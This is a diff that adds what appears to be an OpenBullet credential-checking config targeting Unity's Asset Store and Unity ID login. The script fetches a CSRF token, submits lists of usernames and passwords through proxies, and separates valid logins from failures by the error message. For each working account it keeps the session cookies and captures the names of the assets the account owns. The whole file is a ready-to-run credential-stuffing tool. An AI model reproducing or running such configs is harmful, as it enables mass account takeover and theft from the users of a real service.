@@ -1,0 +1,70 @@
+[SETTINGS]
+{
+  "Name": "Unity",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-04T08:32:05.1220337+00:00",
+  "AdditionalInfo": "",
+  "Author": "Train",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://assetstore.unity.com/auth/login?redirect_to=%2F" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<meta name=\"csrf-token\" content=\"" "\"" Recursive=FALSE -> VAR "auth" "" "" 
+PARSE "<SOURCE>" LR "action=\"/en/conversations/" "\"" Recursive=FALSE -> VAR "uid" "" "" 
+FUNCTION URLEncode "<auth>" -> VAR "auth2" 
+REQUEST POST "https://id.unity.com/en/conversations/<uid>" AutoRedirect=TRUE 
+  CONTENT "utf8=✓&_method=put&authenticity_token=<auth2>&conversations_create_session_form[email]=<USER>&conversations_create_session_form[password]=<PASS>&conversations_create_session_form[remember_me]=false&commit=Sign+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The email and/or password you entered are incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "Page Redirection To Login" 
+PARSE "<SOURCE>" LR "url=" "\"" Recursive=FALSE -> VAR "url" "" "" 
+PARSE "<COOKIES(DS)>" LR "" "" Recursive=FALSE -> VAR "ds" "" "" 
+PARSE "<COOKIES(_hashed_user_id)>" LR "" "" Recursive=FALSE -> VAR "hashed" "" "" 
+FUNCTION ClearCookies "" -> VAR "CLEARING" 
+REQUEST GET "<url>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "_hashed_user_id: <hashed>" 
+  COOKIE "DS: <ds>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://api.unity.com/v1/oauth2/authorize?cid=<uid>&event=next" 
+  HEADER "DNT: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "500" 
+REQUEST GET "https://assetstore.unity.com/account/assets" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" REGEX "<a href=\"/packages/[^\"]*\" target=\".*?\" rel=\".*?\" data-reactid=\".*?\">([^<]*)" "[1]" Recursive=FALSE -> CAP "Asset" "" "" 
